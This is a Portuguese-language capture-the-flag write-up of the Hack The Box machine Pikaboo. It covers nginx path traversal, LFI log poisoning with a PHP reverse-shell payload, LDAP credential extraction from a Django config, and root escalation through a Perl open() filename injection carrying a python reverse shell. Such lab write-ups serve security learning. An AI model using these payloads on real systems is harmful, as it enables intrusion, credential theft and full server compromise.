---
title: HTB Pikaboo Writeup
author: Hastur
date: 2021-09-19 10:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Linux, Hard, Web, Path Traversal, Cron, Perl Script Vuln, LFI]
image: "/img/htb/htb-pikaboo-logo.png"
alt: "HTB Pikaboo Writeup"
---

<img src="/img/htb/htb-pikaboo-logo.png">

<br>


| Nome | Pikaboo       |
|------|-------------|
|IP    | 10.10.10.249|
|Pontos| 40          |
|OS    | Linux       |
|Nível | Insane        |

<br>


## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ sudo nmap -v -p- -sCV -Pn -O 10.10.10.249 --min-rate=512
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo


```
O scan com nmap nos trouxe as portas 21-FTP, 22-SSH e 80-HTTP.

Vamos começar pela porta 21.

### Porta 21

Podemos verificar se o serviço de FTP foi configurado com a opção de login `anonymous`.

<img src="/img/htb/htb-pikaboo-1.png">

Não conseguimos o acesso anonimo, vamos partir para a próxima porta.

### Porta 80

Antes de enumerar com o browser, precisamos adicionar o dominio `pikaboo.htb` em `/etc/hosts`.

<img src="/img/htb/htb-pikaboo-2.png">

Encontramos uma página inicial sem muitos links para seguir, o código fonte da página também não traz nenhuma informação relevante., Vamos enumerar os links.

<img src="/img/htb/htb-pikaboo-3.png">

Em `Pokatdex`, encontramos uma lista `"Pokémons"`, para ser consultada, o link de todos eles leva para a mesma página com a mensagem `"PokeAPI Integration - Coming soon!"`.

<img src="/img/htb/htb-pikaboo-4.png">

Em `Contact`, temos um simplfes formulário de contato sem nada aparentemente utilizável na exploração.

<img src="/img/htb/htb-pikaboo-5.png">

Em `Admin` temos uma tela de auteticação que nos trouxe uma informação relevante. Ao clicarmos em `Cancelar` temos a seguinte informação:

<img src="/img/htb/htb-pikaboo-6.png">

Vemos a resposta de `Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81`, porém na varredura com nmap, vimmos o `Nginx` na porta `80`. O que significa que o Nginx está chamando o Apache que está rodando localmente.

### Exploração

Após um tempo de pesquisa sobre vulnerabilidades no Nginx, que é nossa porta de entrada, encontrei este [artigo](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/).

Basicamente podemos nos aproveitar do Nginx mal configurado para obtermos `Path Traversal` ao adicionarmos `../` na URL e conseguirmos enumerar diretórios, vamos tentar.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ gobuster dir -e -u http://pikaboo.htb/admin../ -w /usr/share/wordlists/dirb/common.txt -r                                                                                                                                            1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pikaboo.htb/admin../
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/19 15:24:00 Starting gobuster in directory enumeration mode
===============================================================
http://pikaboo.htb/admin../.hta                 (Status: 403) [Size: 274]
http://pikaboo.htb/admin../.htaccess            (Status: 403) [Size: 274]
http://pikaboo.htb/admin../.htpasswd            (Status: 403) [Size: 274]
http://pikaboo.htb/admin../admin                (Status: 401) [Size: 456]
http://pikaboo.htb/admin../server-status        (Status: 200) [Size: 6399]
                                                                          
===============================================================
2021/09/19 15:25:36 Finished
===============================================================
```
Aparentemente, nada importante, porém podeos observar que `/server-status` trouxe status `200`, podemos acessá-lo para enumerar.

<img src="/img/htb/htb-pikaboo-7.png">

Encontramos algumas requisições recentes no servido Apache, entre elas, o `/admin_staging`, vamos tentar enumerar esta página.

<img src="/img/htb/htb-pikaboo-8.png">

Caímos em um dashboard com algumas informações sobre o desempenho da página.

Ao enumerar a página, descobrimos que ao clicar em qualquer link, vemos um parâmetro `GET` na url.

<img src="/img/htb/htb-pikaboo-9.png">

Isso nos dá uma dica de que podemos tentar `LFI` através do parâmetro, vamos tentar.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 15349
________________________________________________

/var/log/lastlog        [Status: 200, Size: 307641, Words: 3272, Lines: 368]
/var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414]
/var/log/wtmp           [Status: 200, Size: 169717, Words: 3286, Lines: 558]
:: Progress: [914/914] :: Job [1/1] :: 1079 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
A busca nos trouxe `/var/log/vsftpd.log` que é o log do `VSFTPd`, vamos acessá-lo.

<img src="/img/htb/htb-pikaboo-10.png">

Conseguimos acesso ao log do VSFTPd!!!

Agora podemos utilizar a técnica de `Log Poisoning` para conseguir um `RCE` e talvez um reverse shell, e de quebra, conseguimos enumerar o user `pwnmeow`.
Tudo o que precisamos fazer é tentar nos concectar com o FTP, no lugar do username, inserimos um payload em `PHP`, ao enviarmos uma requisição para o log, teremos a execução do payload.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ ftp 10.10.10.249                                            
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:hastur): <?php exec('/bin/bash -c "bash -i > /dev/tcp/10.10.14.111/8443 0>&1"'); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

Em password, podemos inseir qualquer coisa.

Agora setamos um `netcat` na porta informada no payload e enviamos um curl para o endereço.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```
<img src="/img/htb/htb-pikaboo-11.png">

E conseguimos nosso shell!!!

```bash
www-data@pikaboo:/var/www/html/admin_staging$ cd /home
cd /home
www-data@pikaboo:/home$ ls -la
ls -la
total 568
drwxr-xr-x  3 root    root      4096 May 10 10:26 .
drwxr-xr-x 18 root    root      4096 Jul 27 09:32 ..
drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
www-data@pikaboo:/home$ cd pwnmeow
cd pwnmeow
www-data@pikaboo:/home/pwnmeow$ ls -la
ls -la
total 580
drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -> /dev/null
-r--r----- 1 pwnmeow www-data     33 Sep 19 19:43 user.txt
```

No diretório `/home` encontramos o usuário pwnmeow que já havimos enumerado no log do FTP, e também já podemos obter a flag `user.txt`

Durante a enumeração local, descobrimos que o servidor está rodando um `LDAP` na porta 389.

```bash
www-data@pikaboo:/home/pwnmeow$ netstat -plnt
netstat -plnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      572/nginx: worker p 
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      572/nginx: worker p 
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

```
Ainda na enumeração local, também descobrimos alguns scripts python no diretório `/opt/pokeapi`.

```bash
www-data@pikaboo:/opt/pokeapi$ ls -la
ls -la
total 104
drwxr-xr-x 10 root root 4096 Jul  6 18:58 .
drwxr-xr-x  3 root root 4096 May 20 07:17 ..
drwxr-xr-x  2 root root 4096 May 19 12:04 .circleci
-rw-r--r--  1 root root  253 Jul  6 20:17 .dockerignore
drwxr-xr-x  9 root root 4096 May 19 12:04 .git
drwxr-xr-x  4 root root 4096 May 19 12:04 .github
-rwxr-xr-x  1 root root  135 Jul  6 20:16 .gitignore
-rw-r--r--  1 root root  100 Jul  6 20:16 .gitmodules
-rw-r--r--  1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
-rw-r--r--  1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
-rwxr-xr-x  1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
-rw-r--r--  1 root root 1621 Jul  6 20:16 LICENSE.md
-rwxr-xr-x  1 root root 3548 Jul  6 20:16 Makefile
-rwxr-xr-x  1 root root 7720 Jul  6 20:17 README.md
drwxr-xr-x  6 root root 4096 May 19 12:04 Resources
-rw-r--r--  1 root root    0 Jul  6 20:16 __init__.py
-rw-r--r--  1 root root  201 Jul  6 20:17 apollo.config.js
drwxr-xr-x  3 root root 4096 Jul  6 20:16 config
drwxr-xr-x  4 root root 4096 May 19 12:14 data
-rw-r--r--  1 root root 1802 Jul  6 20:16 docker-compose.yml
drwxr-xr-x  4 root root 4096 May 19 12:04 graphql
-rw-r--r--  1 root root  113 Jul  6 20:16 gunicorn.py.ini
-rwxr-xr-x  1 root root  249 Jul  6 20:16 manage.py
drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
-rw-r--r--  1 root root  375 Jul  6 20:16 requirements.txt
-rw-r--r--  1 root root   86 Jul  6 20:16 test-requirements.txt
```
Enumerando os scripts e diretórios, encontramos algunas informações em `config/settings.py`.

```bash
www-data@pikaboo:/opt/pokeapi/config$ cat settings.py
cat settings.py
# Production settings
import os
from unipath import Path

PROJECT_ROOT = Path(__file__).ancestor(2)

DEBUG = False

TEMPLATE_DEBUG = DEBUG

ADMINS = (("Paul Hallett", "paulandrewhallett@gmail.com"),)

EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"

MANAGERS = ADMINS

BASE_URL = "http://pokeapi.co"

# Hosts/domain names that are valid for this site; required if DEBUG is False
# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts
#ALLOWED_HOSTS = [".pokeapi.co", "localhost", "127.0.0.1"]
ALLOWED_HOSTS = ["*"]

TIME_ZONE = "Europe/London"

LANGUAGE_CODE = "en-gb"

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale.
USE_L10N = True

# If you set this to False, Django will not use timezone-aware datetimes.
USE_TZ = True

# Explicitly define test runner to avoid warning messages on test execution
TEST_RUNNER = "django.test.runner.DiscoverRunner"

SECRET_KEY = "4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"

MIDDLEWARE = [
    "corsheaders.middleware.CorsMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]

ROOT_URLCONF = "config.urls"

WSGI_APPLICATION = "config.wsgi.application"

DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}

CACHES = {
    "default": {
        "BACKEND": "django_redis.cache.RedisCache",
        "LOCATION": "redis://127.0.0.1:6379/1",
        "OPTIONS": {
            "CLIENT_CLASS": "django_redis.client.DefaultClient",
        },
    }
}

SECRET_KEY = os.environ.get(
    "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
)

CUSTOM_APPS = (
    "tastypie",
    "pokemon_v2",
)

INSTALLED_APPS = (
    "django.contrib.auth",
    "django.contrib.contenttypes",
    "django.contrib.sessions",
    "django.contrib.sites",
    "django.contrib.admin",
    "django.contrib.humanize",
    "corsheaders",
    "rest_framework",
    "cachalot",
) + CUSTOM_APPS


API_LIMIT_PER_PAGE = 1

TASTYPIE_DEFAULT_FORMATS = ["json"]

CORS_ORIGIN_ALLOW_ALL = True

CORS_ALLOW_METHODS = "GET"

CORS_URLS_REGEX = r"^/api/.*$"

REST_FRAMEWORK = {
    "DEFAULT_RENDERER_CLASSES": ("drf_ujson.renderers.UJSONRenderer",),
    "DEFAULT_PARSER_CLASSES": ("drf_ujson.renderers.UJSONRenderer",),
    "DEFAULT_PAGINATION_CLASS": "rest_framework.pagination.LimitOffsetPagination",
    "PAGE_SIZE": 20,
    "PAGINATE_BY": 20,
}
```
Encontramos as credencias do `LDAP`!!!

```json
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
```

Com as credenciais, podemos enumerar o LDAP com o `ldapsearch`.

```bash
www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -b "dc=pikaboo,dc=htb" -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"                               
<" -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups
```
Conseguimos a senha do usuário pwnmeow em `base64`, vamos decriptá-la.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_'3m_4lL!_  
```

Conseguimos a senha do usuário, porém ela não foi aceita na conexão via `SSH`, vamos tentar o `FTP`.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:hastur): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Conseguimos acesso ao FTP!!!

Porém não encontramos nada de útil, além do diretório `versions` onde temos permissão de escrita, vamos continuar a enumeração local.

### Escalação de privilégios

Ao enumerar as `crons`, identificamos uma cron feita pelo `root`.

```bash
www-data@pikaboo:/opt/pokeapi/config$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron

www-data@pikaboo:/opt/pokeapi/config$ file /usr/local/bin/csvupdate_cron
file /usr/local/bin/csvupdate_cron
/usr/local/bin/csvupdate_cron: Bourne-Again shell script, ASCII text executable

```

Aparentemente é um script que faz alguma coisa a cada segundo, vamos enumerar o script.

```bash
www-data@pikaboo:/opt/pokeapi/config$ cat /usr/local/bin/csvupdate_cron
cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

Interpretando o scrpt, podemos identificar que ele abre cada diretório dentro de `/srv/ftp/` e roda o script `/usr/local/bin/csvupdate` para cada arquivo terminado em `csv`, porém o script utiliza `basename` no nome do arquivo, para excluir tudo que vier antes de `"/"`, logo em seguida, o script remove todos os arquivos dento do diretório de trabalho.

Como ele roda outro script, o `/usr/local/bin/csvupdate`, vamos enumerá-lo.

```bash
www-data@pikaboo:/opt/pokeapi/config$ file /usr/local/bin/csvupdate
file /usr/local/bin/csvupdate
/usr/local/bin/csvupdate: Perl script text executable
www-data@pikaboo:/opt/pokeapi/config$ cat /usr/local/bin/csvupdate
cat /usr/local/bin/csvupdate
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  'abilities' => 4,
  'ability_changelog' => 3,
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4,
  'ability_names' => 3,
  'ability_prose' => 4,
  'berries' => 10,
  'berry_firmness' => 2,
  'berry_firmness_names' => 3,
  'berry_flavors' => 3,
  'characteristics' => 3,
  'characteristic_text' => 3,
  'conquest_episode_names' => 3,
  'conquest_episodes' => 2,
  'conquest_episode_warriors' => 2,
  'conquest_kingdom_names' => 3,
  'conquest_kingdoms' => 3,
  'conquest_max_links' => 3,
  'conquest_move_data' => 7,
  'conquest_move_displacement_prose' => 5,
  'conquest_move_displacements' => 3,
  'conquest_move_effect_prose' => 4,
  'conquest_move_effects' => 1,
  'conquest_move_range_prose' => 4,
  'conquest_move_ranges' => 3,
  'conquest_pokemon_abilities' => 3,
  'conquest_pokemon_evolution' => 8,
  'conquest_pokemon_moves' => 2,
  'conquest_pokemon_stats' => 3,
  'conquest_stat_names' => 3,
  'conquest_stats' => 3,
  'conquest_transformation_pokemon' => 2,
  'conquest_transformation_warriors' => 2,
  'conquest_warrior_archetypes' => 2,
  'conquest_warrior_names' => 3,
  'conquest_warrior_ranks' => 4,
  'conquest_warrior_rank_stat_map' => 3,
  'conquest_warriors' => 4,
  'conquest_warrior_skill_names' => 3,
  'conquest_warrior_skills' => 2,
  'conquest_warrior_specialties' => 3,
  'conquest_warrior_stat_names' => 3,
  'conquest_warrior_stats' => 2,
  'conquest_warrior_transformation' => 10,
  'contest_combos' => 2,
  'contest_effect_prose' => 4,
  'contest_effects' => 3,
  'contest_type_names' => 5,
  'contest_types' => 2,
  'egg_group_prose' => 3,
  'egg_groups' => 2,
  'encounter_condition_prose' => 3,
  'encounter_conditions' => 2,
  'encounter_condition_value_map' => 2,
  'encounter_condition_value_prose' => 3,
  'encounter_condition_values' => 4,
  'encounter_method_prose' => 3,
  'encounter_methods' => 3,
  'encounters' => 7,
  'encounter_slots' => 5,
  'evolution_chains' => 2,
  'evolution_trigger_prose' => 3,
  'evolution_triggers' => 2,
  'experience' => 3,
  'genders' => 2,
  'generation_names' => 3,
  'generations' => 3,
  'growth_rate_prose' => 3,
  'growth_rates' => 3,
  'item_categories' => 3,
  'item_category_prose' => 3,
  'item_flag_map' => 2,
  'item_flag_prose' => 4,
  'item_flags' => 2,
  'item_flavor_summaries' => 3,
  'item_flavor_text' => 4,
  'item_fling_effect_prose' => 3,
  'item_fling_effects' => 2,
  'item_game_indices' => 3,
  'item_names' => 3,
  'item_pocket_names' => 3,
  'item_pockets' => 2,
  'item_prose' => 4,
  'items' => 6,
  'language_names' => 3,
  'languages' => 6,
  'location_area_encounter_rates' => 4,
  'location_area_prose' => 3,
  'location_areas' => 4,
  'location_game_indices' => 3,
  'location_names' => 4,
  'locations' => 3,
  'machines' => 4,
  'move_battle_style_prose' => 3,
  'move_battle_styles' => 2,
  'move_changelog' => 10,
  'move_damage_classes' => 2,
  'move_damage_class_prose' => 4,
  'move_effect_changelog' => 3,
  'move_effect_changelog_prose' => 3,
  'move_effect_prose' => 4,
  'move_effects' => 1,
  'move_flag_map' => 2,
  'move_flag_prose' => 4,
  'move_flags' => 2,
  'move_flavor_summaries' => 3,
  'move_flavor_text' => 4,
  'move_meta_ailment_names' => 3,
  'move_meta_ailments' => 2,
  'move_meta_categories' => 2,
  'move_meta_category_prose' => 3,
  'move_meta' => 13,
  'move_meta_stat_changes' => 3,
  'move_names' => 3,
  'moves' => 15,
  'move_target_prose' => 4,
  'move_targets' => 2,
  'nature_battle_style_preferences' => 4,
  'nature_names' => 3,
  'nature_pokeathlon_stats' => 3,
  'natures' => 7,
  'pal_park_area_names' => 3,
  'pal_park_areas' => 2,
  'pal_park' => 4,
  'pokeathlon_stat_names' => 3,
  'pokeathlon_stats' => 2,
  'pokedexes' => 4,
  'pokedex_prose' => 4,
  'pokedex_version_groups' => 2,
  'pokemon_abilities' => 4,
  'pokemon_color_names' => 3,
  'pokemon_colors' => 2,
  'pokemon' => 8,
  'pokemon_dex_numbers' => 3,
  'pokemon_egg_groups' => 2,
  'pokemon_evolution' => 20,
  'pokemon_form_generations' => 3,
  'pokemon_form_names' => 4,
  'pokemon_form_pokeathlon_stats' => 5,
  'pokemon_forms' => 10,
  'pokemon_form_types' => 3,
  'pokemon_game_indices' => 3,
  'pokemon_habitat_names' => 3,
  'pokemon_habitats' => 2,
  'pokemon_items' => 4,
  'pokemon_move_method_prose' => 4,
  'pokemon_move_methods' => 2,
  'pokemon_moves' => 6,
  'pokemon_shape_prose' => 5,
  'pokemon_shapes' => 2,
  'pokemon_species' => 20,
  'pokemon_species_flavor_summaries' => 3,
  'pokemon_species_flavor_text' => 4,
  'pokemon_species_names' => 4,
  'pokemon_species_prose' => 3,
  'pokemon_stats' => 4,
  'pokemon_types' => 3,
  'pokemon_types_past' => 4,
  'region_names' => 3,
  'regions' => 2,
  'stat_names' => 3,
  'stats' => 5,
  'super_contest_combos' => 2,
  'super_contest_effect_prose' => 3,
  'super_contest_effects' => 2,
  'type_efficacy' => 3,
  'type_game_indices' => 3,
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```

Ao ler o script, percebemos que ele basicamente faz suas alterações ao captar o nome do arquivo como um argumento, isso exploca o `"$(basename $d) *csv"` no script da cron.

O pesquisar sobre vulnerabilidades em scripts Perl, encontrei este [artigo](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543).

Basicamente ele diz que se o nome do arquivo tiver um pipe `"|"`, o resto do nome do arquivo será executado como um comando, porém, a cron utiliza `basename`, então não podemos executar qualquer payload, se testarmos em nossa máquina local, veremos que o payload simples de reverse shell é cortado pelo basename.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ basename 'bash -c "/bin/bash -i > /dev/tcp/10.10.14.111/8444 0>&1"'
8444 0>&1"
```

O basename vai considerar só o que vem após o último `"/"`, então precisamos de outra alternativa.

É possível obter um reverse shell através do `python`, sem utilizar `/`, vamos criar um arquivo para upload.


```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.111\",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';.csv"
                                                                                                                     
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ ls -la
total 8
drwxr-xr-x  2 hastur hastur 4096 Sep 19 17:14  .
drwxr-xr-x 36 hastur hastur 4096 Sep 19 15:42  ..
-rw-r--r--  1 hastur hastur    0 Sep 19 17:14 '|python -c '\''import os,pty,socket;s=socket.socket();s.connect(("10.10.14.111",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\'';.csv'
```

O que precisamos fazer é setar um `netcat` na porta 8444 e enviar nosso arquivo para o diretório versions, que é onde temos permissão de escrita.

```bash
┌──(hastur㉿hastur)-[~/Pikaboo]
└─$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:hastur): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd versions
250 Directory successfully changed.
ftp> put "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.111\",8444));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(\"sh\")';.csv"
local: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.111",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.111",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv
sh: 1: .csv: not found
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> 
```

<img src="/img/htb/htb-pikaboo-12.png">

E conseguimos noss shell `root`, a flag `root.txt` se encontra no diretório `/root`.


E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>
### Referências

| Vulnerabilidade                           | Url                                                                                                             |
|-------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| Path traversal via misconfigured NGINX alias | [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)|
| Do not use the two-argument form of open() | [https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543)


